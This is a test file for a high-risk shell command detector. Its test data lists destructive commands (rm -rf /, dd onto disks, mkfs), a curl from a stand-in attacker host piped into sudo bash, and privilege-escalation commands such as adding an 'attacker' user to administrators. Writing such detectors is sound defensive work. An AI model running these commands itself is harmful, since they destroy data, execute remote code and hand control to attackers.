import assert from 'node:assert/strict';
import test from 'node:test';
import { matchHighRiskCommand } from '../src/high-risk-commands';

test('matches destructive commands', () => {
  const commands = [
    'rm -rf /',
    'rm -fr /home',
    'rm -rfv node_modules',
    'mkfs.ext4 /dev/sdb',
    'fdisk /dev/sda',
    'dd if=/dev/zero of=/dev/sda',
    'shutdown now',
    'systemctl reboot',
    'chmod -R 777 /',
    'chown -R root /',
    'curl -sL https://evil.example/x.sh | sudo bash',
    'diskpart',
    'format c:'
  ];
  for (const command of commands) {
    assert.ok(matchHighRiskCommand(command), `expected match: ${command}`);
  }
});

test('matches privilege-escalation commands', () => {
  const commands = [
    'sudo apt-get update',
    'su - root',
    'doas reboot',
    'pkexec passwd root',
    'runas /user:admin cmd',
    'chmod u+s /usr/bin/tool',
    'chmod 4755 /usr/bin/tool',
    'chmod 2755 /usr/bin/tool',
    'setuid nobody',
    'visudo',
    'passwd root',
    'useradd attacker',
    'net localgroup administrators attacker /add',
    'chattr +i /etc/passwd'
  ];
  for (const command of commands) {
    assert.ok(matchHighRiskCommand(command), `expected match: ${command}`);
  }
});

test('does not match safe commands or quoted search tokens', () => {
  const commands = [
    'git status',
    'npm run build',
    'ls -la /etc',
    'rm -f /tmp/token',
    'chmod 755 script.sh',
    'cat /etc/passwd',
    'ls -la /usr/bin/sudo',
    'ls /etc/sudoers.d',
    'grep -rIn -- \'sudo\' /srv/project | head -n 1000',
    'grep -rIn -- \'rm -rf\' /srv/project'
  ];
  for (const command of commands) {
    assert.equal(matchHighRiskCommand(command), undefined, `expected safe: ${command}`);
  }
});

test('still matches when the risky token is quoted inside the command', () => {
  assert.ok(matchHighRiskCommand('sudo "apt-get install -y nginx"'));
  assert.ok(matchHighRiskCommand('rm -rf "/"'));
});
